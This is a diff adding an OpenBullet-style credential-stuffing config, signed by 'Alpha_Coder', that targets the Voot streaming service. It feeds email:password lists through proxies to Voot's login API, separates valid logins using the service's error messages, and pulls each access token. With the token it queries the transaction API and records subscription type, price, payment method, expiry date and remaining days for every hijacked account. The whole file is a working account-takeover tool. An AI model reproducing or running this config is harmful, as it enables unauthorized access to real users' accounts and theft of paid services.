@@ -1,0 +1,134 @@
+[SETTINGS]
+{
+  "Name": "Voot",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T22:49:50.3775647+06:00",
+  "AdditionalInfo": "",
+  "Author": "Alpha_Coder (╬ ಠ益ಠ) _|__ <3",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Req REQUEST POST "https://userauth.voot.com/usersV3/v3/login" 
+  CONTENT "{\"type\":\"traditional\",\"deviceId\":\"922d06c8-cc07-49ee-a98f-ef47ed597a19\",\"deviceBrand\":\"PC/MAC\",\"data\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: userauth.voot.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Content-Type: application/json;charset=utf-8" 
+  HEADER "Origin: https://www.voot.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Referer: https://www.voot.com/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 161" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "That’s an incorrect password. Please try again." 
+    KEY "<RESPONSECODE>" Contains "1902" 
+    KEY "\":\"Email is not allowed to be empty" 
+    KEY "\":\"User does not exist" 
+    KEY "If you have any problem in logging in, please contact support@voot.com" 
+  KEYCHAIN Success OR 
+    KEY "\"accessToken\":\"" 
+
+#auth_tk PARSE "<SOURCE>" LR "accessToken\":\"" "\"," -> VAR "auth_tk" 
+
+#Status_Req REQUEST GET "https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list" 
+  
+  HEADER "Host: pxapi.voot.com" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "accesstoken: <auth_tk>" 
+  HEADER "Origin: https://www.voot.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Referer: https://www.voot.com/" 
+  HEADER "Connection: keep-alive" 
+
+#Subscription PARSE "<SOURCE>" LR "name\":\"" "\"," CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Duration PARSE "<SOURCE>" LR "duration\":\"" "\"," CreateEmpty=FALSE -> CAP "Duration" 
+
+#Renew PARSE "<SOURCE>" LR "isRenewable\":" "}," CreateEmpty=FALSE -> CAP "Renew" 
+
+#Price PARSE "<SOURCE>" LR "amount\":" "," CreateEmpty=FALSE -> CAP "Price" 
+
+#Currency PARSE "<SOURCE>" LR "currency\":\"" "\"," -> VAR "Currency" 
+
+#PriceString FUNCTION Replace "<Price>" "<Price> <Currency>" "<Price>" -> CAP "Price" 
+
+#Payment_Method PARSE "<SOURCE>" LR "PaymentGateway\":\"" "\"}," CreateEmpty=FALSE -> CAP "Payment_Method" 
+
+#Vaild PARSE "<SOURCE>" LR "endDate\":{\"timeStamp\":" ",\"" -> VAR "Vaild" 
+
+#ExpiryUnixTo_Gmt FUNCTION UnixTimeToDate "<Vaild>" -> CAP "Expiry" 
+
+#PresentTime FUNCTION CurrentUnixTime -> VAR "PresentTime" 
+
+#getRemainingDays FUNCTION Compute "<Vaild>-<PresentTime>" -> VAR "Remaining_Days_Unix" 
+
+#getdays FUNCTION Compute "(60*60*24)" -> VAR "getdays" 
+
+#getcompute FUNCTION Compute "<Remaining_Days_Unix>/<getdays>" -> VAR "getcompute" 
+
+#Remianing_Days FUNCTION Ceil "<getcompute>" -> CAP "Remianing Days" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Vaild>" GreaterThan "<PresentTime>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"total\":0" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Expiry>" LessThan "<PresentTime>" 
+    KEY "<Expiry>" EqualTo "<PresentTime>" 
+
+#Credit FUNCTION Constant "Alpha_Coder (╬ ಠ益ಠ) _|_" -> CAP "Config By" 
+
